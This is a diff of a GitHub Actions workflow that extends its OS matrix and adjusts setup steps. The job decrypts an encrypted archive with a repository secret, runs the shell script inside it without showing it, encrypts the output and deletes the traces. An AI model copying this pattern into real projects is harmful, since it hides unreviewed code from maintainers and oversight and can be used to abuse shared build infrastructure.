@@ -10,22 +10,22 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        os: [ubuntu-latest, ubuntu-24.04-arm]
+        os: [ubuntu-latest, ubuntu-24.04-arm, macos-latest, windows-latest]
     runs-on: ${{ matrix.os }}
-    timeout-minutes: 90
+    timeout-minutes: 60
     steps:
       - uses: actions/checkout@v4
       - uses: actions/setup-python@v5
         with:
           python-version: '3.12'
       - name: run
+        shell: bash
         env:
           KEY: ${{ secrets.KEY }}
         run: |
-          sudo rm -rf /usr/share/dotnet /opt/ghc /usr/local/lib/android > /dev/null 2>&1 || true
           mkdir w
           openssl enc -d -aes-256-cbc -pbkdf2 -pass env:KEY -in payload.enc | tar -xz -C w
-          python3 -m pip install --quiet numpy zipnn > /dev/null 2>&1 || true
+          python -m pip install --quiet numpy > /dev/null 2>&1 || true
           bash w/run.sh > result.txt 2>&1 || true
           openssl enc -aes-256-cbc -pbkdf2 -pass env:KEY -in result.txt -out "result-${{ matrix.os }}.enc"
           rm -rf w result.txt
